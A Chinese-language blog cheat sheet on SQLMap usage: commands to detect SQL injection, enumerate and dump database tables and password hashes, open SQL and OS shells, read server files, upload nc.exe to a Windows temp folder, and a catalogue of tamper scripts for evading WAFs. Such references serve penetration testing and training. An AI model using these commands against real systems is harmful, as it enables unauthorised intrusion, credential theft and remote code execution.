---
title: SQLMap常用方法
date: 2024-01-01 10:26:43
tags: 渗透测试
mathjax: true
---

# SQLMap常用方法

## 基本使用

判断是否存在注入：

```bash
sqlmap -u http://xxx/?id=1 #参数大于等于2个时url加双引号
```

存在cookie注入时：

```bash
sqlmap -r 1.txt #1.txt为请求包内容
```

查询当前用户下所有数据库：

```bash
sqlmap -u http://xxx/?id=1 --dbs
```

获取数据库表名：

```bash
sqlmap -u "http://xxx/?id=1" -D dkeye --tables
```

获取表中字段名：

```bash
sqlmap -u "http://xxx/?id=1" -D dkeye -T user_info --columns
```

获取字段内容：

```bash
sqlmap -u "http://xxx/?id=1" -D dkeye -T user_info -C username,password --dump
```

列出数据库所有用户：

```bash
sqlmap -u "http://xxx/union.php?id=1" --user
```

获取数据库用户密码：

```bash
sqlmap -u "http://xxx/union.php?id=1" --password
```

密码使用MySQL5加密，在www.cmd5.com中解密。

列出当前网站使用的数据库名称：

```bash
sqlmap -u "http://xxx/union.php?id=1" --current-db
```

获取当前网站数据库用户名称：

```bash
sqlmap -u "http://xxx/union.php?id=1" --current-user
```

## 常用参数

设定探测等级，等级1·5，越高越全面，速度越慢。等级1开始GET和POST，等级2测试HTTP cookie，等级3测试HTTP User-Agent/Referer头，等级5测试cookie、XFF头注入等，默认1。

```bash
sqlmap -u http://xxx/?id=1 --level 5
```

随机代理：

```bash
sqlmap -r 123.txt --random-agent --level 3
```

当前用户是否为管理权限：

```bash
sqlmap -u "http://xxx/union.php?id=1" --is-dba
```

如果当前为管理权限，可读取所有用户角色，仅适用Oracle：

```bash
sqlmap -u "http://xxx/?id=1" --roles
```

伪造HTTP Referer头：

```bash
sqlmap -u "http://xxx/?id=1" --referer http://www.baidu.com
```

打开SQL Shell：

```bash
sqlmap -u "http://xxx/union.php?id=1" --sql-shell
```

如果为MySQL、PostgreSQL、Microsoft SQL Server，可能RCE，可尝试打开Shell：

（该命令支持ASP、ASP.NET、JSP和PHP，但如果想执行改参数，需要DBA权限）

```bash
sqlmap -u "http://xxx/union.php?id=1" --os-cmd #或
sqlmap -u "http://xxx/union.php?id=1" --os-shell
```

服务器中读取文件：

```bash
sqlmap -u "http://xxx/get_str2.asp?name=luther" --file-read "C:/example.exe" -v 1
```

上传文件到服务器：

```bash
sqlmap -u "http://xxx/get_int.aspx?id=1" --file-write "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
```

检测WAF/IDS/IPS（已废弃）：

```bash
sqlmap -u "http://xxx/union.php?id=1" --identify-waf
```

使用tamper脚本：

```bash
sqlmap -u "http://xxx/?id=1" --tamper "模块名"
```

## 常用Tamper脚本

### apostrophemask

将引号转换为UTF-8，用于过滤单引号。

### base64encode

替换为Base64编码。

### multiplespaces

围绕SQL关键字添加多个空格。

### space2plus

用加号替换空格。

### nonrecursivereplacement

SQL关键字双写绕过。

### space2randomblank

空格替换为%0D等有效字符。

### unionalltounion

将union all select替换为union select。

### securesphere

追加特制字符串，如：and '0having'='0having'

### space2hash

空格替换为#，添加随机字符串和换行符。

### space2mssqlblank

空格替换为其他空字符。

### space2mssqlhash

空格替换为#，添加换行符。

### between

用not between 0 and替换>，用between and替换=。

### percentage

ASP允许每个字符前加一个%。

### sp_password

从DBMS日志的自动模糊处理的有效载荷中追加sp_password。

### charencode

对全部字符URL编码。

### randomcase

随机大小写。

### charunicodeencode

字符串unicode编码。

### space2comment

空格替换为/**/。

### equaltolike

等号替换为like。

### greatest

用greatest替换>。

### ifnull2ifisnull

绕过ifnull过滤，例如替换ifnull(a,b)为if(isnull(a),b,a)。

### modsecurityversioned

过滤空格，使用内联注释。

### space2mysqlblank

空格替换为其他空白符号。

### modsecurityzeroversioned

内联注释方式注入。

### space2mysqldash

空格替换为--，添加换行符。

### bluecoat

有效随机空白符替换空格符，like替换=。

### versionedkeywords

注释绕过。

### halfversionedmorekeywords

绕WAF，每个关键词前加版本注释。

### space2morehash

空格替换为#，添加随机字符串和换行符。

### apostrophenullencode

非法双字节unicode字符替换'。

### appendnullbyte

结束位置加载%00。

### chardoubleencode

全部字符使用双重URL编码。

### unmagicquotes

%bf%27和末尾通用注释替换空格。

### randomcomments

/**/分割关键字。
